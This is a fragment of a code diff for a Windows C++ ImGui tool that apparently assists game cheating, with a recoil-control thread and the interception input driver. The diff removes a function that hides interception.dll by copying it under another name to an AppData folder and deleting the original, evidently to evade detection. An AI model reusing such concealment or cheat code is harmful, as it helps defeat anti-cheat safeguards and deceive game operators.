+                      ImGui::Text("Auto Save Settings");
                        
                        // Checkbox to toggle auto save
                        bool auto_save_local = AUTO_SAVE_ENABLED;
@@ -7363,6 +8252,39 @@ int main(int, char**) {
             } // End licensed and valid content
 
             // --- Display Visual Feedback Message (Moved outside view-specific blocks) ---
+            if (g_ui_notice_active.load(std::memory_order_relaxed)) {
+                std::string title;
+                std::string msg;
+                std::string details;
+                UINoticeLevel level;
+                {
+                    std::lock_guard<std::mutex> lock(g_ui_notice_mutex);
+                    title = g_ui_notice_title;
+                    msg = g_ui_notice_message;
+                    details = g_ui_notice_details;
+                    level = g_ui_notice_level;
+                }
+
+                ImVec4 color(1.0f, 1.0f, 1.0f, 1.0f);
+                if (level == UINoticeLevel::Warning) {
+                    color = ImVec4(1.0f, 0.84f, 0.0f, 1.0f);
+                } else if (level == UINoticeLevel::Error) {
+                    color = ImVec4(1.0f, 0.25f, 0.25f, 1.0f);
+                }
+
+                ImGui::Spacing();
+                if (!title.empty()) {
+                    ImGui::TextColored(color, "%s", title.c_str());
+                }
+                if (!msg.empty()) {
+                    ImGui::TextWrapped("%s", msg.c_str());
+                }
+                if (ImGui::Button("Dismiss")) {
+                    clear_ui_notice();
+                }
+                ImGui::Separator();
+            }
+
             if (!g_feedback_message.empty() && std::chrono::steady_clock::now() < g_feedback_message_end_time) {
                 ImGui::Spacing(); // Add some space before the message
                 ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.0f, 1.0f), "%s", g_feedback_message.c_str()); // Green text
@@ -7392,23 +8314,32 @@ int main(int, char**) {
              }
              // No explicit sleep needed here anymore because WaitMessage handles yielding.
         }
+        // If an update has completed and exit was requested, break out of the loop
+        if (g_exit_after_update.load(std::memory_order_relaxed)) {
+            done = true;
+        }
+
+        if (done) break;
+
         // --- Rendering ---
         // Only perform rendering if the window is visible
         if (show_config_window_local)
         {
             // Gamma/Brightness Toggle Logic (Night Mode)
             bool nightModeKeyCurrentlyPressed = (GetAsyncKeyState(g_nightModeKey) & 0x8000) != 0;
-            if (g_isLoggedIn.load(std::memory_order_relaxed) && nightModeKeyCurrentlyPressed && !g_nightModeKeyPressedLastFrame) {
-                if (!g_isGammaInitialized) {
-                    InitializeGammaControls(); // Attempt to initialize if not already
-                }
+            if (!keyboard_hook) {
+                if (g_isLoggedIn.load(std::memory_order_relaxed) && nightModeKeyCurrentlyPressed && !g_nightModeKeyPressedLastFrame) {
+                    if (!g_isGammaInitialized) {
+                        InitializeGammaControls(); // Attempt to initialize if not already
+                    }
 
-                if (g_isGammaInitialized) { // Proceed only if initialization was successful
-                    g_isGammaBoosted = !g_isGammaBoosted;
-                    ApplyCurrentGammaRamp();
-                    // Log messages inside ApplyCurrentGammaRamp will indicate success/failure and new state
-                } else {
-                    printf("Gamma controls are not initialized. Cannot toggle Night Mode.\n");
+                    if (g_isGammaInitialized) { // Proceed only if initialization was successful
+                        g_isGammaBoosted = !g_isGammaBoosted;
+                        ApplyCurrentGammaRamp();
+                        // Log messages inside ApplyCurrentGammaRamp will indicate success/failure and new state
+                    } else {
+                        printf("Gamma controls are not initialized. Cannot toggle Night Mode.\n");
+                    }
                 }
             }
             g_nightModeKeyPressedLastFrame = nightModeKeyCurrentlyPressed;
@@ -7434,65 +8365,16 @@ int main(int, char**) {
     } // End main loop
 
     // 9. Cleanup
+    // Ensure the recoil thread is cleanly stopped and joined at program exit
+    if (recoil_thread_obj.joinable()) {
+        g_recoil_thread_should_run.store(false, std::memory_order_relaxed);
+        recoil_thread_obj.join();
+    }
+
     // Call the dedicated cleanup function before the application exits
     cleanup_and_exit();
 
     return 0;
-}
-// تابع برای مخفی کردن فایل DLL در ابتدای اجرای برنامه
-bool hide_interception_dll() {
-    try {
-        // مسیر فایل DLL در کنار برنامه
-        char current_dir[MAX_PATH];
-        GetCurrentDirectoryA(MAX_PATH, current_dir);
-        std::string dll_path = std::string(current_dir) + "\\interception.dll";
-        
-        // بررسی وجود فایل DLL
-        DWORD fileAttributes = GetFileAttributesA(dll_path.c_str());
-        if (fileAttributes != INVALID_FILE_ATTRIBUTES) {
-            // ایجاد مسیر در AppData برای ذخیره DLL
-            char appDataPath[MAX_PATH];
-            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
-                std::string appFolder = std::string(appDataPath) + "\\CoreProgram";
-                
-                // ایجاد پوشه اگر وجود ندارد
-                DWORD folderAttributes = GetFileAttributesA(appFolder.c_str());
-                if (folderAttributes == INVALID_FILE_ATTRIBUTES) {
-                    CreateDirectoryA(appFolder.c_str(), NULL);
-                }
-                
-                // تنظیم مسیر DLL در پوشه مخفی
-                std::string hidden_dll_path = appFolder + "\\interception_core.dll";
-                
-                // کپی فایل DLL به مسیر مخفی
-                if (CopyFileA(dll_path.c_str(), hidden_dll_path.c_str(), FALSE)) {
-                    std::cout << "Copied interception.dll to hidden location." << std::endl;
-                    
-                    // حذف فایل DLL اصلی
-                    if (DeleteFileA(dll_path.c_str())) {
-                        std::cout << "Successfully deleted original interception.dll." << std::endl;
-                        return true;
-                    } else {
-                        std::cout << "Failed to delete original interception.dll." << std::endl;
-                    }
-                } else {
-                    std::cout << "Failed to copy interception.dll to hidden location." << std::endl;
-                }
-            } else {
-                std::cout << "Failed to get AppData path." << std::endl;
-            }
-        } else {
-            std::cout << "interception.dll not found in application directory." << std::endl;
-            // فایل وجود ندارد، احتمالاً قبلاً مخفی شده است
-            return true;
-        }
-    } catch (const std::exception& e) {
-        std::cout << "Exception while hiding interception.dll: " << e.what() << std::endl;
-    } catch (...) {
-        std::cout << "Unknown error while hiding interception.dll." << std::endl;
-    }
-    
-    return false;
 }
 
 // --- Win32 Message Procedure ---
@@ -7593,9 +8475,8 @@ void CreateRenderTarget() {
         output_log_message("Error: Back buffer is NULL.\n");
     }
 }
-void CleanupRenderTarget() {
+void CleanupRenderTarget() {    
     output_log_message("Cleaning up RenderTargetView...\n");
     if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = NULL; output_log_message("RenderTargetView released.\n"); }
     output_log_message("RenderTargetView cleanup finished.\n");
 }
-
